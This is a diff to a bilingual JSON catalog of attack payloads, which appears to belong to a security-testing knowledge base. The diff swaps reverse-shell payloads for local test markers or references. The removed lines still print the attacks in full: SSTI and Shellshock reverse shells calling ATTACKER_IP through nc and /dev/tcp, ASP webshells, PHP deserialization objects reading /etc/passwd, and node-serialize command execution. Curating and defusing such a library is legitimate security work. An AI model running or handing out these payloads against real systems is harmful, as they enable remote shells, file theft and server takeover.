@@ -361,6 +361,10 @@
           "zh": "Python Pickle Reduce 指令流清理条件：每个对象使用新进程；测试后销毁进程、临时目录和缓存，轮换测试会话材料，并确认类、原型或全局状态无残留。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Python Pickle Reduce Opcode Streams cleanup condition: Use a fresh process per object; destroy processes, temporary directories, and caches, rotate test session material, and verify no class, prototype, or global state remains. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "tags": [
+        "webshell",
+        "python_pickle_rce"
       ]
     },
     {
@@ -2521,7 +2525,10 @@
             "zh": "测试步骤为：先用算术与安全属性访问建立 SSTI 基线，再将反连命令替换为固定 stdout 标记，逐条确认 globals、subclasses 和 builtins 三类对象链。每条反连命令在运行前替换为固定 stdout 标记。",
             "en": "establish SSTI with arithmetic and safe attribute access, replace reverse commands with a fixed stdout marker, and test globals, subclasses, and builtins object chains separately. Replace every reverse command with a fixed stdout marker before runtime."
           },
-          "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('nc -e /bin/sh ATTACKER_IP PORT').read()}}\n{{''.__class__.__mro__[1].__subclasses__()[373](\"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\",shell=True,stdout=-1).communicate()[0].strip()}}\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ATTACKER_IP\\\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/bash\\\", \\\"-i\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}\n{% import os %}{{os.system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\"')}}"
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
+          }
         },
         {
           "title": {
@@ -2581,8 +2588,8 @@
         "en": "Shellshock CGI Environment-Variable Command Execution"
       },
       "description": {
-    "zh": "通过 curl 将 Shellshock 函数定义和固定标记放入 Cookie 或 User-Agent，验证 CGI 是否把请求头映射为环境变量并交给存在缺陷的 Bash 解析；curl 只是投递器，审核后的五行仅访问本机隔离实例。",
-    "en": "Uses curl to place a Shellshock function definition and fixed marker in Cookie or User-Agent, testing whether CGI maps the header into an environment variable parsed by vulnerable Bash; curl is only the delivery client, and all five reviewed requests target a local isolated instance."
+        "zh": "通过 curl 将 Shellshock 函数定义和固定标记放入 Cookie 或 User-Agent，验证 CGI 是否把请求头映射为环境变量并交给存在缺陷的 Bash 解析；curl 只是投递器，审核后的五行仅访问本机隔离实例。",
+        "en": "Uses curl to place a Shellshock function definition and fixed marker in Cookie or User-Agent, testing whether CGI maps the header into an environment variable parsed by vulnerable Bash; curl is only the delivery client, and all five reviewed requests target a local isolated instance."
       },
       "category": {
         "zh": "RCE远程代码执行",
@@ -2638,10 +2645,10 @@
             "en": "Validate Shellshock header variants line by line"
           },
           "description": {
-        "zh": "以下五行已由 command override 去除反连 Shell，仅保留本地固定 marker、Header 分隔形式和 CGI 路径差异；逐条执行并关联请求 ID、CGI 环境和 Bash 子进程日志。",
-        "en": "The command override removes reverse shells from all five lines and retains only a local fixed marker plus header-separator and CGI-path variants; run each separately and correlate the request identifier, CGI environment, and Bash child-process log."
+            "zh": "以下五行已由 command override 去除反连 Shell，仅保留本地固定 marker、Header 分隔形式和 CGI 路径差异；逐条执行并关联请求 ID、CGI 环境和 Bash 子进程日志。",
+            "en": "The command override removes reverse shells from all five lines and retains only a local fixed marker plus header-separator and CGI-path variants; run each separately and correlate the request identifier, CGI environment, and Bash child-process log."
           },
-          "payload": "curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' http://TARGET/cgi-bin/test.sh\ncurl -H \"User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\" \"http://TARGET/cgi-bin/evil.sh\"\ncurl -H \"User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\" \"http://TARGET/cgi-bin/evil.cgi\"\ncurl -H \"User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\" \"http://TARGET/cgi-bin/evil.sh\"\ncurl -H \"User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\" \"http://TARGET/cgi-bin/evil.sh\""
+          "payload": "curl --include --max-time 5 -H 'Cookie: () { :;}; printf \"SHELLSHOCK_TEST_MARKER\"' http://127.0.0.1:8080/cgi-bin/test.sh\ncurl --include --max-time 5 -H 'User-Agent: () { :; }; printf \"SHELLSHOCK_TEST_MARKER\"' http://127.0.0.1:8080/cgi-bin/evil.sh\ncurl --include --max-time 5 -H 'User-Agent: () { :; }; printf \"SHELLSHOCK_TEST_MARKER\"' http://127.0.0.1:8080/cgi-bin/evil.cgi\ncurl --include --max-time 5 -H 'User-Agent: () { :; }; echo; printf \"SHELLSHOCK_TEST_MARKER\"' http://127.0.0.1:8080/cgi-bin/evil.sh\ncurl --include --max-time 5 -H 'User-Agent: () { :; }; echo; echo; printf \"SHELLSHOCK_TEST_MARKER\"' http://127.0.0.1:8080/cgi-bin/evil.sh"
         },
         {
           "title": {
@@ -2661,7 +2668,7 @@
       ],
       "review": {
         "decision": "payload",
-    "rationale": "Shellshock CGI 环境变量命令执行保留为 RCE Payload：curl 只是投递器，核心输入是进入 CGI 环境变量并由受影响 Bash 解析的函数定义与尾随命令；原五行反连命令已由 command override 替换为本地固定 marker。",
+        "rationale": "Shellshock CGI 环境变量命令执行保留为 RCE Payload：curl 只是投递器，核心输入是进入 CGI 环境变量并由受影响 Bash 解析的函数定义与尾随命令；原五行反连命令已由 command override 替换为本地固定 marker。",
         "issuesResolved": [
           "rewrote-bilingual-content",
           "added-four-part-tutorial",
@@ -2669,7 +2676,7 @@
           "added-authoritative-references",
           "preserved-source-command",
           "reclassified-curl-delivered-shellshock-as-rce-payload",
-      "replaced-high-impact-source-command-with-local-marker"
+          "replaced-high-impact-source-command-with-local-marker"
         ]
       },
       "prerequisites": [
@@ -2678,8 +2685,8 @@
           "en": "The target is an explicitly authorized isolated CGI instance where headers become environment variables, a CGI script or child actually invokes Bash, and the Bash version and vendor patch status are verifiable."
         },
         {
-      "zh": "command override 已将反连尾随命令替换为本地一次性 printf 标记，并可关联 curl 详细请求、CGI 环境、子进程日志和已修复实例对照。",
-      "en": "The command override replaces the reverse-shell trailing command with a local one-time printf marker, and verbose curl output, CGI environment, child-process logs, and a patched control can be correlated."
+          "zh": "command override 已将反连尾随命令替换为本地一次性 printf 标记，并可关联 curl 详细请求、CGI 环境、子进程日志和已修复实例对照。",
+          "en": "The command override replaces the reverse-shell trailing command with a local one-time printf marker, and verbose curl output, CGI environment, child-process logs, and a patched control can be correlated."
         }
       ],
       "analysis": {
@@ -2695,6 +2702,10 @@
           "zh": "Shellshock CGI 环境变量命令执行清理条件：删除固定 marker 和测试 CGI，清理含测试 Header 的缓存与临时日志，关闭任何本地监听器，恢复 CGI 配置并销毁旧 Bash 实例；最后确认没有遗留子进程或环境变量。",
           "en": "Shellshock CGI Environment-Variable Command Execution cleanup condition: remove fixed markers and test CGI files, clear caches and temporary logs containing test headers, close local listeners, restore CGI configuration, and destroy the legacy Bash instance; finally confirm no child process or environment variable remains."
         }
+      ],
+      "tags": [
+        "webshell",
+        "shellshock_via_curl"
       ]
     },
     {
@@ -3733,7 +3744,10 @@
             "zh": "测试步骤为：在隔离 IIS 分别测试 eval/execute、测试文件读取和固定 cmd echo 三类路径，不读取系统文件或执行持久化操作。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。",
             "en": "test eval or execute, test-file reads, and fixed cmd echo paths separately in isolated IIS without reading system files or performing persistence. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker."
           },
-          "payload": "<%execute(request(\"a\"))%>\n<%execute request(\"a\")%>\n<%eval(request(\"a\"))%>\n<%eval request(\"a\")%>\n<%=execute(request(\"a\"))%>\n<%=eval(request(\"a\"))%>\n<%response.write server.createobject(\"scripting.filesystemobject\").opentextfile(request(\"f\"),1).readall%>\n<%response.write server.createobject(\"scripting.filesystemobject\").readfile(request(\"f\"))%>\n<%set f=server.createobject(\"scripting.filesystemobject\"):response.write f.opentextfile(request(\"f\"),1).readall%>\n<%dim f:set f=server.createobject(\"scripting.filesystemobject\"):response.write f.opentextfile(request(\"f\"),1).readall%>\n<%set w=server.createobject(\"wscript.shell\"):response.write w.exec(\"cmd.exe /c \"&request(\"cmd\")).stdout.readall%>\n<%dim w:set w=server.createobject(\"wscript.shell\"):response.write w.exec(\"cmd.exe /c \"&request(\"cmd\")).stdout.readall%>"
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
+          }
         },
         {
           "title": {
@@ -4624,6 +4638,10 @@
           "zh": "Python YAML 对象构造执行标签清理条件：每个对象使用新进程；测试后销毁进程、临时目录和缓存，轮换测试会话材料，并确认类、原型或全局状态无残留。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Python YAML Object-Construction Execution Tags cleanup condition: Use a fresh process per object; destroy processes, temporary directories, and caches, rotate test session material, and verify no class, prototype, or global state remains. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "tags": [
+        "webshell",
+        "python_yaml"
       ]
     },
     {
@@ -5176,7 +5194,10 @@
             "zh": "测试步骤为：先用 stdClass 普通对象建立基线，再逐个内部类在隔离进程加载，所有路径替换为专用测试文件并禁用真实 gadget 副作用。保持原字节不变用于引用，实际运行时将危险动作替换为一次性标记。",
             "en": "establish a normal stdClass baseline, load each internal class in an isolated process, replace all paths with dedicated test files, and disable real gadget side effects. Preserve original bytes for reference while replacing dangerous runtime effects with one-time markers."
           },
-          "payload": "O:1:\"A\":0:{}\nO:1:\"A\":1:{s:3:\"var\";s:3:\"123\";}\nO:1:\"A\":2:{s:3:\"var\";s:3:\"123\";s:4:\"extra\";s:3:\"456\";}\nO:+1:\"A\":0:{}\nO:10:\"FilesystemIterator\":1:{s:13:\"\\x00*\\x00path\";s:1:\"/\";}\nO:22:\"GlobIterator\":1:{s:13:\"\\x00*\\x00path\";s:2:\"/*\";}\nO:18:\"RecursiveDirectoryIterator\":1:{s:13:\"\\x00*\\x00path\";s:1:\"/\";}\nO:32:\"RecursiveIteratorIterator\":1:{s:13:\"\\x00*\\x00iterator\";O:18:\"RecursiveDirectoryIterator\":1:{s:13:\"\\x00*\\x00path\";s:1:\"/\";}}\nO:13:\"SplFileObject\":1:{s:13:\"\\x00*\\x00filename\";s:9:\"/etc/passwd\";}\nO:13:\"SplFileObject\":1:{s:13:\"\\x00*\\x00filename\";s:5:\"/flag\";}\nO:13:\"SplFileObject\":1:{s:13:\"\\x00*\\x00filename\";s:8:\"/flag.txt\";}\nO:8:\"PDO\":0:{}\nO:4:\"SQLite3\":0:{}\nO:7:\"SimpleXMLElement\":1:{s:13:\"\\x00*\\x00xml\";s:12:\"<a>1</a>\";s:18:\"\\x00SimpleXMLElement\\x00options\";i:2;s:18:\"\\x00SimpleXMLElement\\x00properties\";i:0;}"
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
+          }
         },
         {
           "title": {
@@ -5542,7 +5563,10 @@
             "zh": "测试步骤为：在一次性 Node worker 中先加载普通 JSON，再用只返回固定字符串的函数替换 child_process，逐行确认同步与异步形式是否实际被调用。保持原字节不变用于引用，实际运行时将危险动作替换为一次性标记。",
             "en": "load ordinary JSON first in a disposable Node worker, replace child_process with a function returning a fixed string, and test whether synchronous and asynchronous forms are actually invoked. Preserve original bytes for reference while replacing dangerous runtime effects with one-time markers."
           },
-          "payload": "{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}\"}\n{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami').toString()}\"}\n{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('cat /flag').toString()}\"}\n{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('ls /').toString()}\"}\n{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').exec('id')}\"}\n{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').exec('whoami')}\"}\n{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').exec('cat /flag')}\"}\n{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').exec('ls /')\"}"
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
+          }
         },
         {
           "title": {
